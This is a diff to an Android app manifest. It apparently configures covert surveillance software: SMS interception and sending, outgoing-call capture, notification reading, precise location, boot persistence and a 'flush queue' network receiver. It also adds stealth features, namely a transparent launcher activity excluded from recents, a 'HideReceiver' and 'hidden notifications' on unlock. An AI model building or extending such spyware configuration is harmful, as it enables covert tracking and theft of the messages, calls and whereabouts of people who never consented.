@@ -1,18 +1,30 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
+    <!-- Network & SMS -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
+
+    <!-- Boot & Alarm -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+
+    <!-- Overlay, Foreground, Notifications -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+
+    <!-- Phone State (for phone number) -->
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+
+    <!-- Location -->
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+
+    <!-- Outgoing Call (optional, for outgoing call capture) -->
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
 
     <application
         android:name=".App"
@@ -22,15 +34,19 @@
         android:theme="@style/AppTheme"
         android:usesCleartextTraffic="true">
 
+        <!-- MainActivity (hide from recents, transparent theme) -->
         <activity
             android:name=".MainActivity"
-            android:exported="true">
+            android:exported="true"
+            android:excludeFromRecents="true"
+            android:theme="@style/TransparentTheme">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
+        <!-- SMS Receiver -->
         <receiver
             android:name=".SmsReceiver"
             android:exported="true"
@@ -40,6 +56,17 @@
             </intent-filter>
         </receiver>
 
+        <!-- Call Receiver -->
+        <receiver
+            android:name=".CallReceiver"
+            android:exported="true">
+            <intent-filter android:priority="1000">
+                <action android:name="android.intent.action.PHONE_STATE" />
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Notification Listener -->
         <service
             android:name=".NotificationListener"
             android:exported="true"
@@ -52,6 +79,7 @@
                 android:resource="@xml/notification_listener_config" />
         </service>
 
+        <!-- Network Receiver (flush queue) -->
         <receiver
             android:name=".NetworkReceiver"
             android:exported="false">
@@ -60,10 +88,12 @@
             </intent-filter>
         </receiver>
 
+        <!-- Hide Receiver (explicit only) -->
         <receiver
             android:name=".HideReceiver"
             android:exported="false" />
 
+        <!-- Boot Receiver -->
         <receiver
             android:name=".BootReceiver"
             android:exported="true">
@@ -72,6 +102,7 @@
             </intent-filter>
         </receiver>
 
+        <!-- Unlock Receiver (for hidden notifications) -->
         <receiver
             android:name=".UnlockReceiver"
             android:exported="false">
@@ -80,6 +111,7 @@
             </intent-filter>
         </receiver>
 
+        <!-- Location Receiver -->
         <receiver
             android:name=".LocationReceiver"
             android:exported="false">
